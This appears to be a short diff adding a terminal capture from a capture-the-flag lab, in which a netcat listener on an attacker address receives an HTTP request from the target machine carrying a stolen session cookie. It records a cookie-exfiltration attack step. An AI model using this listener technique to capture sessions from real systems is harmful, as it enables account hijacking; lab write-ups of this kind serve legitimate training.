@@ -1,0 +1,11 @@
+nc -lvnp 81
+listening on [any] 81 ...
+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.177] 51906
+GET /doc?error=unauthorized_client HTTP/1.1
+Host: 10.10.14.47:81
+User-Agent: python-requests/2.21.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Cookie: sessionid=6wquv6kykv44gi254a3sbajs4v7cu2sh;
+
